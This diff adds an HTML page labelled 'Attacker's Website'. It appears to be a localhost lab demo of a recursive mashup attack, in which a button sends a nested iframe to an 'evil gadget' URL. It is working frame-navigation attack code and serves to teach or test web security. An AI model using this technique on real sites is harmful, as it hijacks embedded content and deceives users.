@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Attacker's Website</title>
+<style>
+	#spTimer{
+		color: #F00;
+	}
+</style>
+<script language="javascript" type="text/javascript">
+    window.onload = function () {
+		/*
+		//This code doesn't work due to SOP. This is not the way to redirect nested frames.
+        var ifrAttacker = document.getElementById("ifrAttacker");
+        var ifrPartner = ifrAttacker.contentWindow.document.getElementById("ifrPartner");
+        ifrPartner.src = "http://localhost:3000/attackerGadget"
+		*/
+		
+		var btnStart=document.getElementById('btnStart');
+		btnStart.onclick=function(){
+			window.frames[0].frames[0].location.href="http://localhost:3000/attackerGadget";
+		}
+    }
+</script>
+</head>
+
+<body>
+<h3> Attacker site - Recursive Mashup Attack!</h3>
+<div><input type="button" id="btnStart" value="Launch attack!"/> (The partner gadget will be redirected to an evil gadget)</div></br>
+<iframe id="ifrAttacker" width="900px" height="350px" src="http://localhost:3000"></iframe>
+
+</body>
+</html>
